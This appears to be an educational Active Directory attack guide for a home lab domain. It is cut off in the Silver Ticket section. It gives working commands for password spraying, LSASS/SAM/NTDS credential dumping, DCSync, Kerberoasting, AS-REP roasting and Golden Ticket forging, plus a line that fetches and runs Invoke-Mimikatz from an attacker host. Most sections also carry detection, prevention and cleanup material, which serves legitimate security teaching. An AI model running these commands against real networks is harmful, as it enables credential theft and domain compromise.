# Active Directory Attack Deep Dive

A comprehensive guide to understanding Active Directory attacks - including the concepts, lab setup, root causes, detection/prevention, and alternative techniques.

---

# Lab Environment Overview

## Architecture

```
                    ┌─────────────────────────────────────────┐
                    │          AKATSUKI.LOCAL                 │
                    │           192.168.56.0/24               │
                    └─────────────────────────────────────────┘
                                      │
         ┌────────────────────────────┼────────────────────────────┐
         │                            │                            │
         ▼                            ▼                            ▼
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│      DC01       │         │      WS01       │         │      WS02       │
│  192.168.56.10  │         │  192.168.56.11  │         │  192.168.56.12  │
│  Win Server 2022│         │   Windows 11    │         │   Windows 11    │
│                 │         │                 │         │                 │
│  Domain         │         │  Local Admin:   │         │  Local Admin:   │
│  Controller     │         │  - pain         │         │  - (none*)      │
│                 │         │                 │         │                 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

*WS02 has no pre-configured vulnerabilities - set up attacks as needed*

## Domain Users

| Username | Full Name | Password | Role | Notes |
|----------|-----------|----------|------|-------|
| itachi | Itachi Uchiha | `Akatsuki123!` | Domain Admin | Member of Domain Admins |
| pain | Nagato Uzumaki | `Password123!` | Local Admin (WS01) | Standard domain user |
| kisame | Kisame Hoshigaki | `Password123!` | Standard User | Shares password with pain (password spraying) |
| deidara | Deidara | `Explosion789!` | Standard User | Unique password |
| sasori | Sasori | `Puppet456!` | Standard User | Unique password |
| orochimaru | Orochimaru | `Snake2024!` | Low Privilege | Attacker starting point |

## Default Lab State (Clean)

The lab starts in a **hardened default state** - no pre-configured vulnerabilities:

- SMB Signing: Enabled on DC (default)
- Kerberos Pre-auth: Required for all users (default)
- No SPNs on user accounts
- No delegation configured
- No special ACL permissions
- No cached credentials from high-privilege users
- LSA Protection: Not enabled (can be added as hardening)

**Philosophy**: Configure vulnerabilities only when testing specific attacks. This teaches you WHAT makes attacks possible.

---

# Table of Contents

1. [Reconnaissance & Enumeration](#1-reconnaissance--enumeration)
   - [Password Spraying](#11-password-spraying)
   - [BloodHound Enumeration](#12-bloodhound-enumeration)
2. [Credential Harvesting](#2-credential-harvesting)
   - [LSASS Memory Extraction](#21-lsass-memory-extraction)
   - [SAM Database Dump](#22-sam-database-dump)
   - [DCSync Attack](#23-dcsync-attack)
   - [NTDS.dit Extraction](#24-ntdsdit-extraction)
3. [Kerberos Attacks](#3-kerberos-attacks)
   - [Kerberoasting](#31-kerberoasting)
   - [AS-REP Roasting](#32-as-rep-roasting)
   - [Golden Ticket](#33-golden-ticket)
   - [Silver Ticket](#34-silver-ticket)
   - [Diamond Ticket](#35-diamond-ticket)
4. [Lateral Movement](#4-lateral-movement)
   - [Pass-the-Hash (PtH)](#41-pass-the-hash-pth)
   - [Pass-the-Ticket (PtT)](#42-pass-the-ticket-ptt)
   - [Overpass-the-Hash](#43-overpass-the-hash)
   - [Remote Execution Methods](#44-remote-execution-methods)
5. [Delegation Attacks](#5-delegation-attacks)
   - [Unconstrained Delegation](#51-unconstrained-delegation)
   - [Constrained Delegation](#52-constrained-delegation)
   - [Resource-Based Constrained Delegation](#53-resource-based-constrained-delegation-rbcd)
6. [ACL/Permission Abuse](#6-aclpermission-abuse)
7. [NTLM Relay Attacks](#7-ntlm-relay-attacks)
8. [Coercion Attacks](#8-coercion-attacks)
9. [Persistence Techniques](#9-persistence-techniques)
10. [ADCS Attacks](#10-adcs-attacks)

---

# 1. Reconnaissance & Enumeration

## 1.1 Password Spraying

### Concept

Password spraying tests a **single password against many accounts** instead of many passwords against one account. This avoids account lockouts while exploiting password reuse.

```
Traditional Brute Force:          Password Spray:
user1 → pass1, pass2, pass3...    pass1 → user1, user2, user3...
(Triggers lockout)                (Stays below lockout threshold)
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Password reuse | Users choose common/similar passwords |
| Weak policies | Passwords like "Summer2024!" meet complexity but are guessable |
| No spray detection | Traditional lockout only tracks per-account failures |
| Large user bases | More users = higher chance someone uses a weak password |

### Lab Setup: Make It Vulnerable

The lab is pre-configured for this attack - pain and kisame share `Password123!`:

```powershell
# Already configured in setup-dc.ps1
# pain and kisame both have: Password123!

# To verify on DC:
Get-ADUser -Filter * -Properties SamAccountName | Select SamAccountName
```

### Attack Methods

**Method 1: CrackMapExec (From Kali)**
```bash
# Create user list
echo -e "itachi\npain\nkisame\ndeidara\nsasori\norochimaru" > users.txt

# Single password against all users
crackmapexec smb 192.168.56.10 -u users.txt -p 'Password123!' --continue-on-success

# Multiple common passwords
crackmapexec smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success
```

**Method 2: Kerbrute (Kerberos-based, stealthier)**
```bash
# Enumerate valid users first
kerbrute userenum --dc 192.168.56.10 -d akatsuki.local users.txt

# Password spray
kerbrute passwordspray --dc 192.168.56.10 -d akatsuki.local users.txt 'Password123!'
```

**Method 3: Spray (PowerShell, from domain-joined machine)**
```powershell
# DomainPasswordSpray module
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password "Password123!" -OutFile spray-results.txt
```

**Method 4: Ruler (for O365/Exchange)**
```bash
# Against Exchange/OWA
ruler --domain akatsuki.local brute --users users.txt --passwords passwords.txt
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4771 | Kerberos pre-authentication failures (spray pattern) |
| Event ID 4625 | Failed logons from single source to many accounts |
| Pattern analysis | Many failed logons within short time window |
| Source IP | Single IP attempting multiple accounts |

**Detection Logic:**
```
IF count(Event 4625 or 4771) > threshold
AND unique(TargetUserName) > 5
AND time_window < 10 minutes
AND source_ip is same
THEN ALERT "Password Spray Detected"
```

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Smart lockout | Azure AD Smart Lockout / fine-grained lockout policies |
| MFA | Multi-factor authentication blocks sprayed credentials |
| Banned passwords | Azure AD Password Protection / custom dictionaries |
| Spray detection | Microsoft ATA/Defender for Identity |
| Long passwords | 15+ character passphrases |

### Alternative Methods

- **RDP spray**: `crowbar -b rdp -s 192.168.56.11/32 -U users.txt -c 'Password123!'`
- **WinRM spray**: `crackmapexec winrm 192.168.56.0/24 -u users.txt -p pass.txt`
- **LDAP spray**: Custom scripts using ldap3 Python library
- **OWA/Exchange spray**: MailSniper, Ruler

---

## 1.2 BloodHound Enumeration

### Concept

BloodHound maps Active Directory relationships to find attack paths. It collects:
- Users, Groups, Computers
- Sessions (who logged in where)
- ACLs (who has rights over what)
- Trusts between domains

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| AD is queryable | Any domain user can query LDAP |
| Session enumeration | Remote registry / NetSessionEnum leaks who's logged in where |
| Complex permissions | Accumulated permissions create unintended attack paths |

### Lab Setup: Pre-requisites

```powershell
# Minimal requirements - just need any domain user
# Use orochimaru (low priv) to demonstrate

# No special setup needed - BloodHound works out of the box
```

### Attack Methods

**From Windows (SharpHound):**
```powershell
# Download SharpHound
# https://github.com/BloodHoundAD/SharpHound

# Run as domain user
.\SharpHound.exe -c All

# Stealth collection (slower, less noisy)
.\SharpHound.exe -c DCOnly --stealth

# Specific collection
.\SharpHound.exe -c Session,LoggedOn  # Just sessions
```

**From Linux (bloodhound-python):**
```bash
# Install
pip install bloodhound

# Collect
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -dc dc01.akatsuki.local -c All

# DNS resolution issues? Use IP
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 192.168.56.10 -c All
```

**Import to BloodHound:**
```bash
# Start neo4j
sudo neo4j console

# Start BloodHound
bloodhound

# Drag and drop .json files to import
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| LDAP queries | Unusual LDAP enumeration patterns |
| Event ID 5145 | Access to SYSVOL, NETLOGON shares |
| NetSessionEnum | Remote session enumeration (Event ID 4624 type 3) |
| Remote registry | SAM/LSA remote queries |

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Restrict session enumeration | GPO: Network access: Restrict clients allowed to make remote calls to SAM |
| Tiered admin model | Separate admin accounts per tier |
| Limit ACL complexity | Regular ACL audits, remove unnecessary permissions |
| Deception | Honey accounts that alert on enumeration |

---

# 2. Credential Harvesting

## 2.1 LSASS Memory Extraction

### Concept

LSASS (Local Security Authority Subsystem Service) stores credentials in memory:
- NTLM hashes for SSO
- Kerberos tickets
- Plaintext passwords (if WDigest enabled)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| SSO requirement | Windows caches credentials for convenience |
| Admin access | Local admin can debug any process |
| WDigest legacy | Older systems store plaintext passwords |
| Memory persistence | Credentials remain until logoff/reboot |

### Lab Setup: Create Cached Credentials

**Step 1: Log in as a high-value user to cache credentials**

```powershell
# On WS02 - RDP or run process as itachi
# Option 1: Interactive RDP login as AKATSUKI\itachi

# Option 2: Run process as itachi (caches creds)
$cred = Get-Credential  # Enter itachi / Akatsuki123!
Start-Process notepad.exe -Credential $cred
```

**Step 2: (Optional) Enable WDigest for plaintext passwords**

```powershell
# On target machine (makes attack more interesting)
# ONLY for lab - reveals plaintext passwords!
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1

# Requires logoff/logon or reboot to take effect
# After re-login, plaintext passwords will be in memory
```

**Step 3: (Optional) Disable LSA Protection for easier extraction**

```powershell
# Check current status
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

# If enabled, disable for lab (makes extraction easier)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0
# Requires reboot
```

### Attack Methods

**Method 1: Mimikatz (In-Memory)**
```powershell
# Requires admin/SYSTEM
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # Dump all credentials
mimikatz # sekurlsa::msv               # Dump NTLM hashes only
mimikatz # sekurlsa::wdigest           # Dump WDigest (plaintext if enabled)
mimikatz # sekurlsa::kerberos          # Dump Kerberos tickets
```

**Method 2: LSASS Dump + Offline Extraction**
```powershell
# Create dump file (various methods)

# Task Manager (GUI)
# Right-click lsass.exe → Create dump file

# Procdump (Sysinternals - often whitelisted)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (LOLBin - Living off the Land)
# Get LSASS PID first
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\lsass.dmp full

# PowerShell (Out-Minidump)
Out-Minidump -Process (Get-Process lsass) -DumpFilePath C:\temp\lsass.dmp
```

```bash
# Parse dump offline (on attacker machine)
pypykatz lsa minidump lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Method 3: Invoke-Mimikatz (PowerShell)**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

**Method 4: SafetyKatz / NanoDump (EDR evasion)**
```powershell
# SafetyKatz - modified mimikatz
SafetyKatz.exe

# NanoDump - creates minidump with obfuscation
NanoDump.exe --write C:\temp\out.dmp
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Process Access (Sysmon 10) | Processes reading LSASS memory |
| LSASS Dumps | lsass.dmp file creation |
| Suspicious Tools | mimikatz.exe, procdump.exe accessing lsass |
| Debug Privilege | SeDebugPrivilege being enabled |
| PowerShell | Invoke-Mimikatz, encoded commands |

**Sysmon Configuration:**
```xml
<!-- Log LSASS access -->
<ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
</ProcessAccess>
```

**Event IDs:**
- 4656: Handle requested to LSASS
- 4663: Access attempt on LSASS
- 10 (Sysmon): Process accessed LSASS

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Credential Guard | Isolates LSASS in virtualized container (Win10 Enterprise) |
| LSA Protection | Run LSASS as Protected Process Light (PPL) |
| Disable WDigest | Ensure UseLogonCredential = 0 |
| Reduce cached creds | Limit interactive logons, use network logons |
| EDR | Monitor for LSASS access patterns |

**Enable LSA Protection:**
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
# Requires reboot
```

### Cleanup: Restore Clean State

```powershell
# Disable WDigest (if enabled)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0

# Clear cached credentials
klist purge

# Log out high-privilege accounts
# Simply log out any itachi sessions
```

---

## 2.2 SAM Database Dump

### Concept

The Security Account Manager (SAM) database stores:
- Local user account password hashes
- Account metadata (SID, last login, etc.)

Location: `C:\Windows\System32\config\SAM` (encrypted with SYSTEM key)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Local accounts | SAM contains local user hashes |
| Password reuse | Local admin often same across machines |
| Hash persistence | Hashes don't change until password change |
| Offline attack | Can crack hashes without detection |

### Lab Setup: Pre-requisites

```powershell
# SAM attack requires local admin access
# Use: pain on WS01 (already local admin)
# Or: Local vagrant account

# No special setup needed - SAM is always present
```

### Attack Methods

**Method 1: Registry Save (Requires Admin)**
```powershell
# Save registry hives
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save

# Transfer to attacker machine, then:
```

```bash
# Extract offline with Impacket
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

**Method 2: Volume Shadow Copy**
```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Copy from shadow (bypasses file locks)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
```

**Method 3: Mimikatz**
```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**Method 4: Impacket (Remote)**
```bash
# Requires local admin creds
secretsdump.py AKATSUKI/pain:'Password123!'@192.168.56.11 -just-dc-ntlm
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| reg.exe saving SAM/SYSTEM | LAPS for unique local admin passwords |
| VSS creation (Event ID 8222) | Disable local Administrator account |
| Access to SAM file | Credential Guard |
| secretsdump network patterns | Network segmentation |

---

## 2.3 DCSync Attack

### Concept

Domain Controllers replicate data using MS-DRSR protocol. If you have replication rights, you can request password hashes for any user.

```
Attacker with Replication Rights → "I'm a DC, give me password hashes"
                                 → DC complies, returns NTLM hashes
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Replication by design | DCs need to sync password hashes |
| Abusable rights | Replication rights grant hash access |
| No user distinction | Protocol doesn't verify requester is actual DC |

### Lab Setup: Make It Vulnerable

**Option A: Use existing Domain Admin (itachi)**

```powershell
# itachi is Domain Admin, already has DCSync rights
# No setup needed - just use itachi's credentials
```

**Option B: Grant DCSync rights to low-privilege user**

```powershell

# Run on DC as Domain Admin
# Grant orochimaru DCSync rights (makes attack possible from low-priv)
Import-Module ActiveDirectory

$user = "orochimaru"
$domain = "DC=akatsuki,DC=local"

# Get user SID
$userSid = (Get-ADUser $user).SID

# Add Replicating Directory Changes
$acl = Get-Acl "AD:\$domain"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSid,
    "ExtendedRight",
    "Allow",
    [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
)
$acl.AddAccessRule($ace)

# Add Replicating Directory Changes All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSid,
    "ExtendedRight",
    "Allow",
    [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
)
$acl.AddAccessRule($ace2)

Set-Acl "AD:\$domain" $acl

Write-Host "Granted DCSync rights to $user" -ForegroundColor Yellow
```

### Attack Methods

**Method 1: Mimikatz**
```powershell
# DCSync specific user
mimikatz # lsadump::dcsync /user:AKATSUKI\Administrator

# DCSync all users
mimikatz # lsadump::dcsync /all /csv

# DCSync krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /user:AKATSUKI\krbtgt
```

**Method 2: Impacket secretsdump**
```bash
# With password
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10

# With NTLM hash
secretsdump.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.10

# Just NTDS (all users)
secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10

# Just krbtgt
secretsdump.py -just-dc-user krbtgt AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10
```

**Method 3: CrackMapExec**
```bash
crackmapexec smb 192.168.56.10 -u itachi -p 'Akatsuki123!' --ntds
```

### Blue Team: Detection

| Event ID | Description |
|----------|-------------|
| 4662 | Directory Service Access (look for Replicating Directory Changes) |
| 4624 | Logon from unusual source making replication requests |

**Detection Logic:**
```
IF (Event 4662)
AND (Properties contains "Replicating Directory Changes")
AND (SubjectUserName NOT IN domain_controllers)
THEN ALERT "Potential DCSync Attack"
```

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Limit replication rights | Audit who has these rights, remove if unnecessary |
| Protected Users group | Add sensitive accounts |
| Monitor privileged groups | Alert on changes to Domain Admins |
| Network segmentation | Limit what can talk to DC on replication ports |

**Find accounts with DCSync rights:**
```powershell
Import-Module ActiveDirectory
$domain = (Get-ADDomain).DistinguishedName

(Get-Acl "AD:\$domain").Access | Where-Object {
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
} | Select IdentityReference
```

### Cleanup: Remove Vulnerability

```powershell
# Remove DCSync rights from orochimaru
$user = "orochimaru"
$domain = "DC=akatsuki,DC=local"
$userSid = (Get-ADUser $user).SID

$acl = Get-Acl "AD:\$domain"
$acl.Access | Where-Object { $_.IdentityReference -match $user } | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "AD:\$domain" $acl
```

---

## 2.4 NTDS.dit Extraction

### Concept

`NTDS.dit` is the Active Directory database file containing all domain objects and password hashes. Unlike DCSync, this is file-based.

Location: `C:\Windows\NTDS\ntds.dit` (on DCs only)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Centralized storage | All hashes in one file |
| File-based | Can extract offline without network |
| Volume shadow copies | Bypass file locks |

### Lab Setup: Pre-requisites

```powershell
# Requires admin access on Domain Controller
# Use: AKATSUKI\itachi or local Administrator

# No special setup needed - NTDS.dit is always present
```

### Attack Methods

**Method 1: VSS Shadow Copy**
```powershell
# On the DC (requires admin)
vssadmin create shadow /for=C:

# Copy files
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

```bash
# Extract hashes offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**Method 2: ntdsutil**
```powershell
# Create IFM (Install From Media) backup
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntdsutil" quit quit

# Files in: C:\temp\ntdsutil\Active Directory\ntds.dit
#           C:\temp\ntdsutil\registry\SYSTEM
```

**Method 3: diskshadow**
```powershell
# Create script
$script = @"
set context persistent nowriters
add volume c: alias myalias
create
expose %myalias% z:
"@
$script | Out-File C:\temp\shadow.txt

# Execute
diskshadow /s C:\temp\shadow.txt

# Copy from Z:\
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

**Method 4: NinjaCopy (PowerShell)**
```powershell
# Bypasses file locks without VSS
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| VSS creation (Event ID 8222) | Limit admin access on DCs |
| ntdsutil/diskshadow execution | Monitor for suspicious file copies |
| Large file copies from DC | Backup integrity monitoring |
| Shadow copy access | EDR on Domain Controllers |

---

# 3. Kerberos Attacks

## Understanding Kerberos First

### How Kerberos Authentication Works

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client  │         │   KDC    │         │ Service  │
│ (User)   │         │  (DC)    │         │ (Server) │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │ 1. AS-REQ          │                    │
     │ (username +        │                    │
     │  encrypted         │                    │
     │  timestamp)        │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 2. AS-REP          │                    │
     │ (TGT encrypted     │                    │
     │  with krbtgt hash) │                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 3. TGS-REQ         │                    │
     │ (TGT + SPN)        │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 4. TGS-REP         │                    │
     │ (Service Ticket    │                    │
     │  encrypted with    │                    │
     │  service acct hash)│                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 5. AP-REQ (Service Ticket)              │
     │────────────────────────────────────────>│
```

**Key Points:**
- **TGT (Ticket Granting Ticket)**: Encrypted with krbtgt hash, proves identity
- **TGS (Service Ticket)**: Encrypted with service account hash, grants access
- **krbtgt**: Special account whose hash encrypts all TGTs

---

## 3.1 Kerberoasting

### Concept

Any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's password hash - crack it offline!

```
Attacker → Request TGS for MSSQLSvc/server → Get encrypted ticket → Crack offline
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Any user can request tickets | No restrictions on TGS requests |
| Weak service passwords | Service accounts often have guessable passwords |
| Offline cracking | No lockout, no detection |
| RC4 encryption | Fast to crack compared to AES |

### Lab Setup: Make It Vulnerable

**Step 1: Create a service account with SPN**

```powershell
# Run on DC as Domain Admin

# Create service account
$password = ConvertTo-SecureString "SQLServicePass123!" -AsPlainText -Force
New-ADUser -Name "svc_sql" `
    -SamAccountName "svc_sql" `
    -UserPrincipalName "svc_sql@akatsuki.local" `
    -Description "SQL Service Account - Kerberoastable" `
    -Path "OU=Shinobi,DC=akatsuki,DC=local" `
    -AccountPassword $password `
    -Enabled $true `
    -PasswordNeverExpires $true

# Set SPN (makes it Kerberoastable)
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.akatsuki.local:1433"}

# Verify
Get-ADUser svc_sql -Properties ServicePrincipalName | Select ServicePrincipalName

Write-Host "Created svc_sql with SPN - vulnerable to Kerberoasting" -ForegroundColor Yellow
```

### Attack Methods

**Method 1: Rubeus (Windows)**
```powershell
# Kerberoast all SPNs
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
```

**Method 2: Impacket GetUserSPNs (Linux)**
```bash
# Request tickets
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request

# Output hashcat format
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request -outputfile hashes.txt
```

**Method 3: PowerView**
```powershell
# Find Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request tickets
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

**Cracking:**
```bash
# Hashcat (mode 13100 = Kerberos 5 TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4769 | TGS requests with RC4 encryption (0x17) |
| Anomaly detection | Single user requesting many service tickets |
| Unusual ticket requests | For services user doesn't normally access |

**Honey Account:** Create a fake service account with SPN. Alert when anyone requests a ticket.

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Strong passwords | 25+ character passwords for service accounts |
| Managed Service Accounts | gMSA/sMSA with auto-rotating passwords |
| AES encryption | Force Kerberos to use AES |
| Limit SPNs | Remove unnecessary SPNs |

**Set account to AES only:**
```powershell
Set-ADUser -Identity svc_sql -KerberosEncryptionType AES128,AES256
```

### Cleanup: Remove Vulnerability

```powershell
# Remove the service account
Remove-ADUser -Identity "svc_sql" -Confirm:$false
```

---

## 3.2 AS-REP Roasting

### Concept

Normally, Kerberos requires pre-authentication (proves you know password). If disabled, anyone can request an AS-REP encrypted with the user's hash - crack offline!

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Pre-auth disabled | User flag "Do not require Kerberos preauthentication" |
| No auth needed | Can request AS-REP without any credentials |
| Offline cracking | No lockout, no detection |

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Disable pre-auth for sasori (makes him AS-REP roastable)
Set-ADAccountControl -Identity sasori -DoesNotRequirePreAuth $true

# Verify
Get-ADUser sasori -Properties DoesNotRequirePreAuth | Select DoesNotRequirePreAuth

Write-Host "sasori is now vulnerable to AS-REP Roasting" -ForegroundColor Yellow
```

### Attack Methods

**Method 1: Rubeus (Windows)**
```powershell
# AS-REP roast all vulnerable users
Rubeus.exe asreproast /outfile:asrep.txt

# Target specific user
Rubeus.exe asreproast /user:sasori
```

**Method 2: Impacket GetNPUsers (Linux)**
```bash
# No credentials needed! Just need usernames
GetNPUsers.py AKATSUKI/ -dc-ip 192.168.56.10 -usersfile users.txt -no-pass -format hashcat

# With credentials (finds vulnerable users automatically)
GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request
```

**Method 3: PowerView**
```powershell
# Find AS-REP roastable users
Get-DomainUser -PreauthNotRequired
```

**Cracking:**
```bash
# Hashcat (mode 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| Event ID 4768 with pre-auth type 0 | Enable pre-auth on all accounts |
| AS-REQ without pre-auth | Regular audit for misconfigured accounts |

**Find vulnerable accounts:**
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Cleanup: Remove Vulnerability

```powershell
# Re-enable pre-auth for sasori
Set-ADAccountControl -Identity sasori -DoesNotRequirePreAuth $false
```

---

## 3.3 Golden Ticket

### Concept

The TGT is encrypted with the **krbtgt** hash. With this hash, forge TGTs for ANY user - including non-existent users with any group membership!

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| krbtgt key | Single key encrypts all TGTs |
| DC trusts TGT | No additional verification |
| Long validity | TGTs valid for 10 years by default |
| Any user | Can impersonate anyone |

### Lab Setup: Pre-requisites

```powershell
# Golden Ticket requires krbtgt hash
# This means you already have domain admin (DCSync) or NTDS.dit

# Step 1: Get krbtgt hash via DCSync (requires Domain Admin)
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user krbtgt

# Note the NTLM hash for krbtgt

# Step 2: Get Domain SID
Get-ADDomain | Select DomainSID
# or: whoami /user (take SID minus last number)
```

### Attack Methods

**Method 1: Mimikatz**
```powershell
# Create Golden Ticket
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt

# With specific groups (512=Domain Admins)
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /groups:512,519,518,520 /ptt

# Save to file instead
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ticket:golden.kirbi
```

**Method 2: Rubeus**
```powershell
Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_HASH /ptt

# AES256 (stealthier)
Rubeus.exe golden /aes256:AES_HASH /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /ptt
```

**Method 3: Impacket ticketer**
```bash
# Create ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin

# Use ticket
export KRB5CCNAME=fakeadmin.ccache
psexec.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4769 | TGS request for non-existent user |
| Ticket lifetime | Unusually long ticket lifetimes |
| PAC validation | Claims membership that doesn't match AD |

### Blue Team: Prevention & Response

| Action | Implementation |
|--------|----------------|
| Reset krbtgt twice | Invalidates all tickets (causes brief disruption) |
| Reduce ticket lifetime | Shorter TGT lifetime |
| Monitor krbtgt hash access | Alert on DCSync for krbtgt |

**krbtgt Reset Procedure:**
```powershell
# Reset twice (wait for replication between)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass1!" -AsPlainText -Force)
# Wait for replication...
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass2!" -AsPlainText -Force)
```

---

## 3.4 Silver Ticket

### Concept

Service Tickets are encrypted with the service account's hash. Forge tickets for specific services without touching the DC.

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Service key | Each service uses its own key |
| No DC contact | Forged locally, more stealthy |
| Direct access | Goes straight to target service |

### Lab Setup: Pre-requisites

```powershell
# Need service account hash
# Option 1: Kerberoast the service account
# Option 2: DCSync the computer account (for CIFS, HOST, etc.)
# Option 3: Compromise the server running the service

# Get computer account hash (for CIFS access to that computer)
